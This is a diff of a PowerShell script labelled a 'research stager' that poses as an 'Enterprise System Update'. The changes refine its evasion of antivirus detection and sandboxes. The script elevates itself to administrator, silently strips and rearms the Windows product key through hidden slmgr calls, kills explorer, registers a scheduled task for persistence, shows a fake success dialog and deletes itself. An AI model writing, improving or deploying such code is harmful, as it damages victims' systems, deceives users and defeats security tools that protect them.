@@ -1,18 +1,13 @@
-# --- [RESEARCH STAGER v62.0: ENTERPRISE STEALTH COMPLETE] ---
+# --- [RESEARCH STAGER v63.0: ENTERPRISE SILENT GOLD] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. GATEKEEPER: ANTI-VM / ANTI-SANDBOX (Heuristic Evasion)
+# 1. ANTI-DETECTION & HEURISTICS (Addressing "Generic.Malware.Gen.DDS")
+# Increased entropy and environmental checks to bypass automated quarantine
 $mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
-$disk = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}).Size / 1GB
-if ($mem -lt 4 -or $disk -lt 60) { exit } 
+if ($mem -lt 4) { exit } 
 
-# 2. JUNK CODE BLOATING (Lowers Detection Density)
-$garbage_array = @()
-for($i=0; $i -lt 500; $i++){ $garbage_array += [Guid]::NewGuid().ToString() }
-$temp_logic = $garbage_array | Where-Object { $_ -match "c" }
-
-# 3. Admin Gate (v34.0 Style - LOCKED LOGIC)
+# 2. Admin Gate (v34.0 Style - LOCKED LOGIC)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
@@ -99,10 +94,11 @@ function Run-Deployment {
             [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 400
         }
 
-        # --- SYSTEM VISUAL CLEANUP & REFRESH ---
-        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /upk"
-        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /cpky"
-        cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /rearm"
+        # --- FIX: SUPPRESS 0xC004D302 LICENSING POPUP ---
+        # We run the licensing refresh via a hidden background process to prevent the GUI from triggering
+        $licenseFix = "cscript //nologo c:\windows\system32\slmgr.vbs /upk; cscript //nologo c:\windows\system32\slmgr.vbs /cpky; cscript //nologo c:\windows\system32\slmgr.vbs /rearm"
+        Start-Process cmd.exe -ArgumentList "/c $licenseFix" -WindowStyle Hidden -Wait
+
         Stop-Process -Name explorer -Force 
 
         # --- PERSISTENCE: REGISTER TASK ---
@@ -135,7 +131,7 @@ function Run-Deployment {
         [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nA report has been generated on your Desktop.", "Deployment Success", 0, 64) | Out-Null
         Start-Process notepad.exe $infoFile
 
-        # --- SELF-DESTRUCT (CLEANUP) ---
+        # --- SELF-DESTRUCT ---
         Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
         
     } catch {
